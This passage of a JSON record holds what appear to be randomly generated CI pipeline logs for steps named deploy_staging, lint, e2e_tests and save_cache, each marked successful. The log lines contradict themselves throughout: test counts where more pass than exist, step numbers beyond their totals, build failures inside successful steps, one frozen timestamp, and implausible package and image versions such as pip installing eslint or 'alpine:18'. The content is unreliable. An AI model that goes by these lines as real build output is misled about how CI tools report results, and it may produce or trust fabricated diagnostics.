          "WARNING: prettier has known vulnerabilities",
          "yarn add: Done in 29.67s",
          "Cache hit for key-5293",
          "Transforming 579 files...",
          "\u2717 build failed with exit code 49",
          "Optimizing 35 modules...",
          "[12:47:57] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Compiling src/handler.rs...",
          "Completed.",
          "Cache restored successfully (43MB)",
          "WARNING: axios has known vulnerabilities",
          "NODE_ENV=production",
          "Coverage: 95% statements, 97% branches",
          "\u2713 build completed",
          "Using Python 3.9",
          "  PASS: test_user_create (79ms)",
          "Environment: test",
          "pip: Collecting prettier",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "Step 8/22: Testing",
          "\u2713 Step 'install' succeeded",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 10/18: Running migrations",
          "HEAD is now at 12b2b84",
          "npm install: resolved 1347 packages",
          "[12:47:57] INFO: Connecting to database",
          "[12:47:57] INFO: Processing request",
          "Cache restored successfully (460MB)",
          "Transforming 341 files...",
          "Step 1/17: Running migrations",
          "Connection established",
          "HEAD is now at 7f25365",
          "WARNING: jest has known vulnerabilities",
          "NODE_ENV=test",
          "[12:47:57] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Generating source maps...",
          "Fetching from https://github.com/package.json",
          "Verifying...",
          "Step 17/18: Linting",
          "  PASS: integration/test_api_health.spec.js",
          "Installing axios@5.5.4",
          "Image pulled successfully",
          "yarn add: Done in 1.12s",
          "Fetching submodules...",
          "Pulling image: alpine:3.11",
          "Step 17/17: Linting",
          "Artifact uploaded: dist.zip (33MB)",
          "npm install: resolved 551 packages",
          "[12:47:57] INFO: Request completed",
          "[12:47:57] INFO: Connecting to database",
          "[12:47:57] WARN: Deprecated API usage",
          "Time: 117.181s",
          "Already up to date.",
          "Processing...",
          "[12:47:57] DEBUG: Query executed in 78ms",
          "\u2713 Task completed in 2887ms",
          "Platform: darwin-arm64",
          "Pulling image: alpine:18",
          "Environment: development",
          "[12:47:57] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (45MB)",
          "Success!",
          "Test Suites: 27 passed, 20 total",
          "Snapshots: 1 passed, 33 total",
          "pip: Installing build dependencies...",
          "Exception: RuntimeError",
          "GET /health - 201 (44ms)",
          "npm notice: created a lockfile",
          "Optimizing 60 modules...",
          "yarn add: Done in 12.26s",
          "Cache saved successfully",
          "[12:47:57] WARN: Deprecated API usage",
          "Done.",
          "POST /upload - 202 (324ms)",
          "Fetching submodules...",
          "Ran 116 tests in 2s",
          "[12:47:57] INFO: Processing request",
          "Pushing to registry...",
          "Bundling styles.js",
          "Waiting...",
          "Success!",
          "Completed.",
          "[12:47:57] INFO: Cache refreshed",
          "Compiling utils/app.ts...",
          "\u2713 Task completed in 544ms",
          "  PASS: e2e/test_db_connect.spec.js",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-04T12:52:29.926608",
        "finished_at": "2025-12-04T12:53:04.847954",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:47:57] DEBUG: Initializing service",
          "Platform: win32-x64",
          "Already up to date.",
          "[12:47:57] DEBUG: Query executed in 78ms",
          "Cache hit for key-4643",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-5908",
          "GET /status - 201 (2ms)",
          "Snapshots: 6 passed, 35 total",
          "Success!",
          "NODE_ENV=development",
          "Finished.",
          "[12:47:57] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (58MB)",
          "  PASS: test_db_connect (72ms)",
          "Pulling image: node:18",
          "Compiling utils/service.java...",
          "GET /health - 200 (19ms)",
          "pip: Downloading prettier-5.20.tar.gz",
          "Platform: win32-x64",
          "Transforming 152 files...",
          "  PASS: test_user_create (417ms)",
          "Using Python 3.10",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Optimizing 87 modules...",
          "Creating production build...",
          "NODE_ENV=production",
          "Step 3/18: Running migrations",
          "[12:47:57] WARN: Deprecated API usage",
          "  PASS: test_user_create (196ms)",
          "Success!",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Platform: win32-x64",
          "Fetching from https://npmjs.org/package.json",
          "Snapshots: 32 passed, 4 total",
          "Waiting...",
          "Artifact uploaded: dist.zip (32MB)",
          "npm notice: created a lockfile",
          "Processing...",
          "Cache miss for key-6497",
          "Compiling src/app.ts...",
          "Processing...",
          "[12:47:57] INFO: Connecting to database",
          "Waiting...",
          "pip: Downloading prettier-5.5.tar.gz",
          "[12:47:57] DEBUG: Connection pool: 1 active",
          "Cache saved successfully",
          "[12:47:57] INFO: Cache refreshed",
          "\u2713 package completed",
          "Loading...",
          "POST /api - 201 (62ms)",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "Step 19/24: Building",
          "Step 17/25: Building",
          "[12:47:57] INFO: Processing request",
          "Waiting...",
          "Compiling lib/handler.rs...",
          "Compiling src/service.java...",
          "Tests: 436 passed, 472 total",
          "Installing react@4.12.7",
          "Minifying app.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Verifying...",
          "Fetching from https://pypi.org/package.json",
          "Pushing to registry...",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Using Node.js 14.12.1",
          "Fetching submodules...",
          "Transforming 108 files...",
          "Creating production build...",
          "Step 1/21: Deploying",
          "npm install: resolved 959 packages",
          "NODE_ENV=development",
          "npm notice: package.json updated",
          "Completed.",
          "Time: 61.386s",
          "Platform: win32-x64",
          "HEAD is now at c4476ab",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Task completed in 3912ms",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] INFO: Request completed",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Layer 9/14: RUN command",
          "Finished.",
          "yarn add: Done in 29.92s",
          "pip: Downloading express-4.18.tar.gz",
          "npm install: resolved 1254 packages",
          "pip: Installing build dependencies...",
          "Platform: win32-x64",
          "Environment: test",
          "pip: Downloading lodash-1.17.tar.gz",
          "Tests: 236 passed, 83 total",
          "Bundling vendor.js",
          "Loading...",
          "Generating source maps...",
          "Step 12/18: Running migrations",
          "Step 5/22: Deploying",
          "OK",
          "npm install: added 326 packages",
          "Verifying...",
          "Using Python 3.9",
          "[12:47:57] INFO: Processing request",
          "npm notice: package.json updated",
          "Ran 172 tests in 19s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Building Docker image...",
          "\u2717 build failed with exit code 74",
          "\u2717 build failed with exit code 127",
          "npm notice: package.json updated",
          "Step 19/22: Running migrations",
          "npm notice: created a lockfile",
          "Step 3/22: Installing dependencies",
          "Ready.",
          "Artifact uploaded: dist.zip (7MB)",
          "POST /data - 201 (461ms)",
          "[12:47:57] INFO: Cache refreshed",
          "Artifact downloaded: 37MB",
          "Test Suites: 37 passed, 41 total",
          "Tests: 494 passed, 161 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 13/20: Installing dependencies",
          "[12:47:57] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Coverage: 90% statements, 60% branches",
          "\u2713 Step 'install' succeeded",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:57] DEBUG: Memory usage: 1459MB",
          "Minifying vendor.js",
          "Finished.",
          "Waiting...",
          "Success!",
          "[12:47:57] DEBUG: Connection pool: 6 active",
          "Compiling components/app.ts...",
          "Compiling utils/utils.go...",
          "Step 17/19: Installing dependencies",
          "[12:47:57] DEBUG: Query executed in 83ms",
          "[12:47:57] DEBUG: Memory usage: 534MB",
          "\u2713 All checks passed",
          "Cache invalidated: build",
          "Creating production build...",
          "npm install: added 457 packages",
          "Ran 158 tests in 51s",
          "NODE_ENV=production",
          "Time: 116.315s",
          "FAILED: test_api_health",
          "Image pulled successfully",
          "Coverage: 90% statements, 71% branches",
          "npm notice: package.json updated",
          "\u2713 Task completed in 522ms",
          "Step 17/23: Deploying",
          "Platform: win32-x64",
          "GET /status - 201 (76ms)",
          "\u2713 All checks passed",
          "Optimizing 56 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:57] INFO: Connecting to database",
          "Done.",
          "\u2713 validate completed",
          "Loading...",
          "[12:47:57] WARN: Deprecated API usage",
          "Compiling lib/app.ts...",
          "Cache saved successfully",
          "Layer 1/14: RUN command",
          "Using Python 3.12",
          "Step 8/21: Linting",
          "Test Suites: 15 passed, 9 total",
          "Step 8/21: Deploying",
          "Compiling components/main.py...",
          "  PASS: e2e/test_user_create.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:57] INFO: Processing request",
          "Layer 10/14: COPY command",
          "NODE_ENV=test",
          "Cache miss for key-8132",
          "Creating production build...",
          "Step 2/20: Testing",
          "HEAD is now at 801372d",
          "[12:47:57] INFO: Cache refreshed",
          "Test Suites: 48 passed, 7 total",
          "Step 14/24: Linting",
          "Step 9/24: Linting",
          "[12:47:57] DEBUG: Memory usage: 1162MB",
          "pip: Installing build dependencies...",
          "HEAD is now at 875879d",
          "Success!",
          "Using Python 3.10",
          "Processing...",
          "Artifact uploaded: dist.zip (51MB)",
          "Step 3/16: Running migrations",
          "Cache restored successfully (345MB)",
          "Cache saved successfully",
          "\u2713 Step 'checkout' succeeded",
          "Step 2/25: Linting",
          "[12:47:57] WARN: Deprecated API usage",
          "\u2713 Step 'test' succeeded",
          "[12:47:57] INFO: Processing request",
          "Step 15/24: Installing dependencies",
          "Loading...",
          "Compiling utils/index.js...",
          "Test Suites: 38 passed, 12 total",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-04T12:53:04.847954",
        "finished_at": "2025-12-04T12:53:39.769300",
        "log_lines": [
          "=== Step: lint ===",
          "Uploading artifact 'dist' (42 files)",
          "Processing...",
          "Finished.",
          "Optimizing 28 modules...",
          "Tests: 435 passed, 86 total",
          "Test Suites: 6 passed, 39 total",
          "Success!",
          "\u2717 build failed with exit code 33",
          "Success!",
          "Success!",
          "Completed.",
          "GET /status - 200 (66ms)",
          "Creating production build...",
          "Cache invalidated: node_modules",
          "FAILED: test_api_health",
          "npm notice: created a lockfile",
          "pip: Collecting express",
          "[12:47:57] INFO: Processing request",
          "Checking out main branch",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] INFO: Processing request",
          "Step 15/22: Building",
          "Tests: 165 passed, 384 total",
          "Ready.",
          "[12:47:57] DEBUG: Initializing service",
          "pip install: Successfully installed eslint-4.10",
          "Step 18/15: Running migrations",
          "Cache saved successfully",
          "[12:47:57] DEBUG: Initializing service",
          "Success!",
          "Cache miss for key-5488",
          "[12:47:57] DEBUG: Query executed in 81ms",
          "[12:47:57] DEBUG: Query executed in 49ms",
          "Generating source maps...",
          "[12:47:57] INFO: Cache refreshed",
          "GET /status - 201 (33ms)",
          "Time: 4.603s",
          "npm notice: created a lockfile",
          "Processing...",
          "pip install: Successfully installed lodash-4.19",
          "Cache miss for key-6155",
          "WARNING: react has known vulnerabilities",
          "npm install: added 110 packages",
          "[12:47:57] DEBUG: Loading configuration",
          "Compiling lib/handler.rs...",
          "Step 4/24: Testing",
          "[12:47:57] DEBUG: Initializing service",
          "Layer 5/9: ENV command",
          "Step 20/24: Testing",
          "Finished.",
          "Using Python 3.9",
          "Fetching submodules...",
          "Done.",
          "GET /api - 204 (52ms)",
          "Step 9/25: Linting",
          "Loading...",
          "Generating source maps...",
          "Connection established",
          "OK",
          "\u2713 deploy completed",
          "Ready.",
          "Environment: staging",
          "Compiling src/handler.rs...",
          "Image pulled successfully",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] DEBUG: Query executed in 42ms",
          "pip install: Successfully installed webpack-3.4",
          "TLS handshake completed",
          "Tests: 448 passed, 403 total",
          "Cache hit for key-7553",
          "Layer 2/12: RUN command",
          "WARNING: jest has known vulnerabilities",
          "Image pulled successfully",
          "[12:47:57] DEBUG: Connection pool: 5 active",
          "[12:47:57] DEBUG: Connection pool: 15 active",
          "WARNING: jest has known vulnerabilities",
          "Creating production build...",
          "Waiting...",
          "Coverage: 83% statements, 61% branches",
          "Optimizing 15 modules...",
          "Snapshots: 26 passed, 39 total",
          "[12:47:57] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "Using Node.js 15.17.0",
          "[12:47:57] ERROR: Connection failed",
          "Test Suites: 27 passed, 9 total",
          "Waiting...",
          "[12:47:57] INFO: Starting build process",
          "Finished.",
          "\u2713 Task completed in 267ms",
          "[12:47:57] INFO: Cache refreshed",
          "Cache miss for key-8954",
          "\u2713 Step 'install' succeeded",
          "POST /data - 202 (73ms)",
          "yarn add: Done in 10.55s",
          "NODE_ENV=test",
          "Time: 97.870s",
          "Ran 78 tests in 10s",
          "WARNING: axios has known vulnerabilities",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "WARNING: prettier has known vulnerabilities",
          "Switched to branch 'hotfix/task-965'",
          "Compiling utils/service.java...",
          "Compiling lib/main.py...",
          "WARNING: axios has known vulnerabilities",
          "Minifying main.js",
          "Cache miss for key-2560",
          "Processing...",
          "GET /status - 204 (21ms)",
          "npm install: resolved 1563 packages",
          "Bundling runtime.js",
          "Building Docker image...",
          "Layer 6/10: COPY command",
          "Success!",
          "Transforming 190 files...",
          "Creating production build...",
          "\u2713 All checks passed",
          "Verifying...",
          "  PASS: e2e/test_db_connect.spec.js",
          "\u2713 validate completed",
          "Step 14/23: Linting",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (271MB)",
          "Test Suites: 42 passed, 44 total",
          "TLS handshake completed",
          "Transforming 676 files...",
          "  PASS: e2e/test_api_health.spec.js",
          "Done.",
          "\u2713 validate completed",
          "Minifying app.js",
          "[12:47:57] DEBUG: Query executed in 52ms",
          "Finished.",
          "pip: Installing build dependencies...",
          "\u2713 Step 'test' succeeded",
          "[12:47:57] INFO: Cache refreshed",
          "Time: 112.714s",
          "Loading...",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 18/19: Testing",
          "[12:47:57] WARN: Deprecated API usage",
          "Coverage: 72% statements, 83% branches",
          "\u2713 Step 'setup' succeeded",
          "Completed.",
          "Step 12/20: Running migrations",
          "HEAD is now at 2f0e32d",
          "Cache miss for key-1162",
          "POST /data - 202 (319ms)",
          "Checking out main branch",
          "[12:47:57] DEBUG: Connection pool: 14 active",
          "Compiling lib/index.js...",
          "Coverage: 91% statements, 62% branches",
          "Step 16/24: Running migrations",
          "Compiling utils/index.js...",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/main.py...",
          "NODE_ENV=production",
          "npm notice: created a lockfile",
          "\u2713 Step 'setup' succeeded",
          "Using Node.js 15.2.1",
          "\u2713 Task completed in 3163ms",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-169'",
          "Test Suites: 50 passed, 34 total",
          "Ran 131 tests in 45s",
          "Minifying app.js",
          "Connection established",
          "[12:47:57] DEBUG: Connection pool: 14 active",
          "npm notice: created a lockfile",
          "  PASS: unit/test_user_create.spec.js",
          "Connection established",
          "Step 19/19: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: eslint has known vulnerabilities",
          "Step 13/24: Testing",
          "Using Python 3.11",
          "NODE_ENV=test",
          "FAILED: test_db_connect",
          "pip: Installing build dependencies...",
          "Snapshots: 28 passed, 31 total",
          "Exception: ValueError",
          "[12:47:57] DEBUG: Initializing service",
          "Minifying app.js",
          "Optimizing 23 modules...",
          "[12:47:57] DEBUG: Query executed in 54ms",
          "yarn add: Done in 22.3s",
          "npm install: added 47 packages",
          "HEAD is now at 22d8831",
          "Transforming 944 files...",
          "Compiling components/index.js...",
          "WARNING: eslint has known vulnerabilities",
          "NODE_ENV=development",
          "Compiling src/utils.go...",
          "\u2713 All checks passed",
          "Layer 3/8: ENV command",
          "Tests: 241 passed, 269 total",
          "Building Docker image...",
          "Test Suites: 42 passed, 24 total",
          "yarn add: Done in 4.87s",
          "  PASS: integration/test_db_connect.spec.js",
          "Success!",
          "[12:47:57] INFO: Request completed",
          "Cache restored successfully (116MB)",
          "npm notice: created a lockfile",
          "Compiling lib/service.java...",
          "Bundling runtime.js",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-04T12:53:39.769300",
        "finished_at": "2025-12-04T12:54:14.690646",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 Task completed in 971ms",
          "npm install: added 406 packages",
          "Compiling src/handler.rs...",
          "Compiling lib/index.js...",
          "[12:47:57] INFO: Request completed",
          "[12:47:57] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "  PASS: test_db_connect (138ms)",
          "Generating source maps...",
          "[12:47:57] DEBUG: Connection pool: 16 active",
          "  PASS: test_user_create (305ms)",
          "[12:47:57] DEBUG: Connection pool: 4 active",
          "Ready.",
          "pip install: Successfully installed axios-5.17",
          "[12:47:57] DEBUG: Query executed in 58ms",
          "WARNING: express has known vulnerabilities",
          "Fetching submodules...",
          "pip install: Successfully installed eslint-1.6",
          "Fetching from https://github.com/package.json",
          "\u2713 deploy completed",
          "Layer 5/15: COPY command",
          "Completed.",
          "Processing...",
          "Snapshots: 14 passed, 49 total",
          "Step 20/17: Testing",
          "GET /status - 204 (66ms)",
          "\u2713 Task completed in 4375ms",
          "Using Node.js 18.17.3",
          "Coverage: 83% statements, 62% branches",
          "[12:47:57] INFO: Cache refreshed",
          "Test Suites: 24 passed, 5 total",
          "Checking out develop branch",
          "Minifying main.js",
          "Finished.",
          "\u2713 Task completed in 3405ms",
          "Completed.",
          "Step 2/23: Running migrations",
          "OK",
          "Fetching from https://githubusercontent.com/package.json",
          "Success!",
          "[12:47:57] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Fetching from https://npmjs.org/package.json",
          "[12:47:57] INFO: Starting build process",
          "POST /upload - 200 (384ms)",
          "TLS handshake completed",
          "Completed.",
          "Platform: linux-x64",
          "GET /api - 200 (26ms)",
          "Step 3/25: Installing dependencies",
          "Step 2/16: Running migrations",
          "Compiling utils/service.java...",
          "Switched to branch 'hotfix/task-230'",
          "Image pulled successfully",
          "Step 20/22: Linting",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "Layer 7/14: ENV command",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "[12:47:57] INFO: Processing request",
          "Completed.",
          "POST /data - 200 (291ms)",
          "Already up to date.",
          "[12:47:57] INFO: Starting build process",
          "Cache saved successfully",
          "Step 8/15: Running migrations",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] DEBUG: Memory usage: 880MB",
          "Connection established",
          "[12:47:57] INFO: Connecting to database",
          "Fetching from https://googleapis.com/package.json",
          "NODE_ENV=production",
          "Compiling lib/index.js...",
          "WARNING: webpack has known vulnerabilities",
          "pip: Downloading eslint-2.9.tar.gz",
          "GET /status - 201 (41ms)",
          "TLS handshake completed",
          "Using Python 3.9",
          "[12:47:57] DEBUG: Connection pool: 10 active",
          "WARNING: prettier has known vulnerabilities",
          "Step 4/17: Installing dependencies",
          "Loading...",
          "Ready.",
          "TLS handshake completed",
          "Success!",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Installing react@4.2.5",
          "Compiling src/main.py...",
          "[12:47:57] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip install: Successfully installed lodash-5.20",
          "[12:47:57] DEBUG: Connection pool: 2 active",
          "Snapshots: 7 passed, 6 total",
          "Pulling image: alpine:latest",
          "[12:47:57] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Completed.",
          "\u2713 Task completed in 2882ms",
          "Time: 84.37s",
          "Generating source maps...",
          "Cache saved successfully",
          "Time: 16.405s",
          "Step 13/25: Building",
          "Artifact uploaded: dist.zip (35MB)",
          "Step 1/16: Testing",
          "Connection established",
          "Fetching submodules...",
          "Using Node.js 17.11.7",
          "  PASS: e2e/test_db_connect.spec.js",
          "Step 5/24: Running migrations",
          "Pulling image: python:latest",
          "Success!",
          "npm install: resolved 942 packages",
          "Compiling components/handler.rs...",
          "Using Python 3.12",
          "[12:47:57] WARN: Deprecated API usage",
          "Coverage: 90% statements, 77% branches",
          "[12:47:57] DEBUG: Connection pool: 15 active",
          "Tests: 89 passed, 112 total",
          "Verifying...",
          "[12:47:57] DEBUG: Query executed in 22ms",
          "Uploading artifact 'dist' (40 files)",
          "Checking out develop branch",
          "Step 11/24: Installing dependencies",
          "Ready.",
          "Step 11/23: Running migrations",
          "Loading...",
          "pip install: Successfully installed react-4.7",
          "\u2713 Step 'checkout' succeeded",
          "Uploading artifact 'coverage' (31 files)",
          "Cache hit for key-3042",
          "POST /data - 201 (323ms)",
          "Test Suites: 13 passed, 17 total",
          "[12:47:57] INFO: Request completed",
          "Installing lodash@2.9.0",
          "Connection established",
          "[12:47:57] INFO: Connecting to database",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:47:57] INFO: Connecting to database",
          "  PASS: test_api_health (234ms)",
          "Processing...",
          "[12:47:57] WARN: Deprecated API usage",
          "Artifact downloaded: 11MB",
          "yarn add: Done in 8.15s",
          "Minifying app.js",
          "[12:47:57] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-278'",
          "Step 16/23: Deploying",
          "Using Python 3.9",
          "Finished.",
          "[12:47:57] DEBUG: Initializing service",
          "Compiling lib/index.js...",
          "Loading...",
          "pip: Downloading webpack-1.17.tar.gz",
          "WARNING: express has known vulnerabilities",
          "Transforming 251 files...",
          "Using Python 3.12",
          "Cache miss for key-8981",
          "[12:47:57] WARN: Deprecated API usage",
          "Waiting...",
          "Test Suites: 19 passed, 38 total",
          "Minifying main.js",
          "TLS handshake completed",
          "Snapshots: 32 passed, 38 total",
          "Ready.",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Finished.",
          "Platform: linux-x64",
          "Layer 1/15: RUN command",
          "Snapshots: 1 passed, 11 total",
          "Artifact uploaded: dist.zip (43MB)",
          "npm install: added 289 packages",
          "Verifying...",
          "pip: Collecting webpack",
          "Generating source maps...",
          "Completed.",
          "Completed.",
          "[12:47:57] DEBUG: Memory usage: 755MB",
          "[12:47:57] INFO: Connecting to database",
          "[12:47:57] WARN: Deprecated API usage",
          "Step 9/22: Testing",
          "[12:47:57] DEBUG: Query executed in 78ms",
          "Compiling lib/main.py...",
          "WARNING: react has known vulnerabilities",
          "Using Python 3.11",
          "Cache saved successfully",
          "Layer 7/15: RUN command",
          "[12:47:57] INFO: Cache refreshed",
          "Done.",
          "Image pulled successfully",
          "[12:47:57] ERROR: Connection failed",
          "Cache saved successfully",
          "TLS handshake completed",
          "Pulling image: python:3.11",
          "Installing lodash@4.9.4",
          "Bundling styles.css",
          "TLS handshake completed",
          "Building Docker image...",
          "Test Suites: 45 passed, 7 total",
          "Compiling src/app.ts...",
          "[12:47:57] INFO: Cache refreshed",
          "Finished.",
          "Coverage: 81% statements, 76% branches",
          "Coverage: 94% statements, 68% branches",
          "WARNING: express has known vulnerabilities",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-04T12:54:14.690646",
        "finished_at": "2025-12-04T12:54:35.643453",
        "log_lines": [
          "=== Step: save_cache ===",
          "Verifying...",
          "Artifact uploaded: dist.zip (8MB)",
          "Step 19/17: Building",
          "Compiling lib/app.ts...",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Platform: darwin-arm64",
          "Checking out master branch",
          "npm install: added 88 packages",
          "Step 7/22: Installing dependencies",
          "\u2713 Task completed in 3279ms",
          "Snapshots: 7 passed, 7 total",
          "Transforming 588 files...",
          "Already up to date.",
          "Step 12/23: Linting",
          "Step 20/17: Running migrations",
          "npm install: added 79 packages",
          "Uploading artifact 'coverage' (27 files)",
          "Verifying...",
          "Optimizing 36 modules...",
          "GET /health - 200 (47ms)",
          "Success!",
          "npm install: added 54 packages",
          "Platform: darwin-arm64",
          "WARNING: webpack has known vulnerabilities",
          "[12:47:57] INFO: Connecting to database",
          "Exception: ValueError",
          "[12:47:57] DEBUG: Loading configuration",
          "Layer 1/14: ENV command",
          "Done.",
          "FAILED: test_cache_hit",
          "Step 15/16: Deploying",
          "[12:47:57] ERROR: Connection failed",
          "  PASS: test_db_connect (199ms)",
          "Loading...",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "[12:47:57] WARN: Deprecated API usage",
          "Processing...",
          "Artifact downloaded: 24MB",
          "Generating source maps...",
          "Uploading artifact 'coverage' (7 files)",
          "Processing...",
          "Compiling lib/app.ts...",
          "\u2717 build failed with exit code 67",
          "[12:47:57] DEBUG: Connection pool: 16 active",
          "\u2713 All checks passed",
          "Generating source maps...",
          "NODE_ENV=test",
          "Step 13/24: Building",
          "[12:47:57] DEBUG: Memory usage: 1386MB",
          "[12:47:57] DEBUG: Memory usage: 199MB",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Pulling image: node:18",
          "GET /status - 200 (92ms)",
          "[12:47:57] DEBUG: Connection pool: 3 active",
          "Generating source maps...",
          "Cache miss for key-7809",
          "Ready.",
          "Compiling components/app.ts...",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (94MB)",
          "Snapshots: 40 passed, 17 total",
          "  PASS: test_auth_login (125ms)",
          "Platform: linux-x64",
          "Generating source maps...",
          "Pushing to registry...",
          "npm install: resolved 540 packages",
          "Fetching from https://pypi.org/package.json",
          "[12:47:57] INFO: Processing request",
          "\u2717 build failed with exit code 66",
          "[12:47:57] DEBUG: Loading configuration",
          "\u2713 build completed",
          "Minifying main.js",
          "Step 4/19: Testing",
          "\u2713 test completed",
          "Step 10/24: Linting",
          "Snapshots: 50 passed, 41 total",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "GET /status - 204 (73ms)",
          "Coverage: 83% statements, 65% branches",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] INFO: Cache refreshed",
          "Uploading artifact 'build' (43 files)",
          "Test Suites: 7 passed, 33 total",
          "Exception: RuntimeError",
          "Cache saved successfully",
          "Using Python 3.11",
          "Using Node.js 17.20.5",
          "Step 20/21: Running migrations",
          "Compiling lib/service.java...",
          "Loading...",
          "  PASS: test_user_create (289ms)",
          "Environment: staging",
          "TLS handshake completed",
          "Fetching from https://githubusercontent.com/package.json",
          "Ready.",
          "Pulling image: node:3.11",
          "Pulling image: alpine:latest",
          "Fetching from https://github.com/package.json",
          "Creating production build...",
          "Step 20/23: Deploying",
          "[12:47:57] ERROR: Connection failed",
          "pip: Downloading eslint-1.1.tar.gz",
          "  PASS: test_api_health (72ms)",
          "NODE_ENV=production",
          "\u2713 deploy completed",
          "npm install: added 332 packages",
          "Layer 1/9: COPY command",
          "[12:47:57] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "Checking out master branch",
          "Checking out develop branch",
          "yarn add: Done in 14.31s",
          "Generating source maps...",
          "[12:47:57] INFO: Cache refreshed",
          "Transforming 910 files...",
          "[12:47:57] INFO: Connecting to database",
          "[12:47:57] INFO: Starting build process",
          "Step 14/17: Installing dependencies",
          "npm notice: created a lockfile",
          "Completed.",
          "[12:47:57] DEBUG: Connection pool: 7 active",
          "TLS handshake completed",
          "Step 15/23: Installing dependencies",
          "Processing...",
          "Checking out develop branch",
          "Using Python 3.12",
          "Environment: development",
          "  PASS: unit/test_user_create.spec.js",
          "Snapshots: 26 passed, 47 total",
          "[12:47:57] INFO: Request completed",
          "WARNING: prettier has known vulnerabilities",
          "Completed.",
          "Step 10/25: Linting",
          "Pushing to registry...",
          "WARNING: jest has known vulnerabilities",
          "Connection established",
          "Step 20/24: Linting",
          "TLS handshake completed",
          "Exception: TypeError",
          "[12:47:57] INFO: Cache refreshed",
          "Connection established",
          "Using Python 3.9",
          "  PASS: test_auth_login (31ms)",
          "FAILED: test_user_create",
          "OK",
          "Connection established",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Waiting...",
          "Compiling lib/utils.go...",
          "Compiling utils/main.py...",
          "Platform: linux-x64",
          "HEAD is now at 0676a19",
          "Transforming 379 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: added 138 packages",
          "Processing...",
          "Test Suites: 23 passed, 26 total",
          "npm install: added 157 packages",
          "Cache hit for key-4199",
          "[12:47:57] WARN: Deprecated API usage",
          "FAILED: test_user_create",
          "Snapshots: 33 passed, 39 total",
          "\u2713 All checks passed",
          "Optimizing 80 modules...",
          "Step 15/23: Deploying",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Waiting...",
          "Uploading artifact 'build' (37 files)",
          "OK",
          "Compiling lib/handler.rs...",
          "[12:47:57] INFO: Connecting to database",
          "POST /data - 201 (206ms)",
          "Waiting...",
          "\u2717 build failed with exit code 60",
          "pip: Installing build dependencies...",
          "[12:47:57] INFO: Starting build process",
          "[12:47:57] WARN: Deprecated API usage",
          "Verifying...",
          "Transforming 844 files...",
          "Step 3/17: Running migrations",
          "OK",
          "Creating production build...",
          "Artifact downloaded: 35MB",
